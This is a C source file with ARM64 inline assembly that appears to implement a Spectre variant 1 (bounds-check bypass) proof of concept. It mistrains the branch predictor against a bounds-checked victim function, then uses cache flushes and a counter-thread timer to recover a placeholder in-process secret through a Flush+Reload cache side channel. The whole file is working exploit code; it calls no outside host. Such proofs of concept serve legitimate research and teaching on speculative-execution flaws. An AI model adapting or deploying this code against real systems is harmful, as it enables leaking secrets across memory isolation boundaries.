#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>


volatile uint64_t counter = 0;
unsigned int buffer_size = 16;
u_int8_t buffer[16] = {0,1,2,3,4,5,6,7,8,9, 10, 11, 12, 13, 14, 15};
u_int8_t array[256*4096];
char*secret = "aaaaaaaaaaaaaaaaaaaaaaaaa";
u_int8_t temp = 0;

static inline void flush(void *addr) {
	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
	asm volatile("DSB SY");
}

void *inc_counter(void *a) {
	while (1) {
		counter++;
		asm volatile ("DMB SY");
	}
}


static u_int64_t timed_read(volatile uint8_t *addr) {
	u_int64_t ns = counter;

	asm volatile (
		"DSB SY\n"
		"LDR X5, [%[ad]]\n"
		"DSB SY\n"
		: : [ad] "r" (addr) : "x5");

	return counter - ns;
}



#define DELTA 1024

void flushSideChannel()
{
  int i;// Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  // Flush the values of the array from cache
  for (i = 0; i < 256; i++) flush(&array[i*4096 +DELTA]);
}

// Sandbox Functionu
void victim(size_t x){
	if (x < buffer_size) {
		temp &= array[buffer[x]*4096 + DELTA];
	}
}

void spectre(size_t offset){
  int i;
  u_int8_t s;
	register u_int64_t time;
	size_t training_x, x;
	static int results[256];
	for(i=0; i<256; i++){
		results[i] = 0;
	}

	int tries;
	int j;
	for (tries = 999; tries > 0; tries--) {
		flushSideChannel();

		training_x = tries % buffer_size;
		for (j = 29; j >= 0; j--) {
			flush(&buffer_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (offset ^ training_x));

			/* Call the victim! */
			victim(x);
		}
		for(i = 0; i < 256; i++){
	    time = timed_read(&array[i*4096 + DELTA]);
	    if (time <= 10){
	      results[i] += 1;
	    }
	  }
	}
	for(i=0; i<256; i++){
		printf("(%d, %d) \t", i, results[i]);
	}
}

int main(int argc, const char**argv){
  int thresh = atoi(argv[1]);
  printf("Secret %p\n",(void*)&secret);
  printf("Buffer %p\n",(void*)&buffer);
  printf("Array %p\n",(void*)&array);
  pthread_t inc_counter_thread;
	if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
		fprintf(stderr, "Error creating thread\n");
		return 1;
	}
	while (counter < 10000000);
	asm volatile ("DSB SY");
	flushSideChannel();


  size_t larger_x = (size_t)(secret - (char*)buffer);
  spectre(larger_x+4);

  return (0);
}
